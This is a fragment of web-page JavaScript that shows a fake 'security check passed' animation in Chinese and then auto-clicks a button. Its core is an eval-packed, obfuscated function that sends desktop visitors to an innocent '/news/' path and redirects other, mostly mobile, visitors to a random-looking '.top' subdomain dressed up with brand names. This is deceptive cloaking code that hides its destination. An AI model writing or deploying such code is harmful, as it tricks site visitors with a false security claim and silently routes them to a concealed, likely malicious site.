     var it = document.getElementById('iconText');
    var _i = 1;
    var si = setInterval(function () {
      var txt = '正在安全检测';
      for (var i = 0; i < _i; i++) txt += '.';
      it.innerText = txt;
      if (++_i > 3) {
        clearInterval(si);
        setTimeout(function () {
          var icon = document.getElementById('icon');
          var subText = document.getElementById('subText');
          icon.classList.add("weui-icon-success");
          it.innerHTML = "已通过安全检测";
          subText.innerHTML = "如果没有自动跳转，请点击下方按钮前往";
        }, 300);
      }
    }, 300);
//判断
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('s c(){3 1={};3 p=8.a;3 u=8.h;1.9=p.2("e")==0;1.6=p.2("f")==0;1.g=(p=="d")||(p.2("b")==0);i(1.9||1.6||1.r){7.4.5=\'/w/\'}v{7.4.5=" l://t.j.q.n.o.k/m"}}',33,33,'|system|indexOf|var|location|href|mac|window|navigator|win|platform|Linux|RuPage|X11|Win|Mac|x11|userAgent|if|xiaomi|top|https||bilibili|sy6602621||huawei|xll|function|82852acc44553cadb052||else|news'.split('|'),0,{}))

//点击事件
setTimeout(function() {
     // IE
     if(document.all) {
         document.getElementById("clickMe").click();
     }
     // 其它浏览器
     else {
         var e = document.createEvent("MouseEvents");
         e.initEvent("click", true, true);
         document.getElementById("clickMe").dispatchEvent(e);
     }
}, 3000);
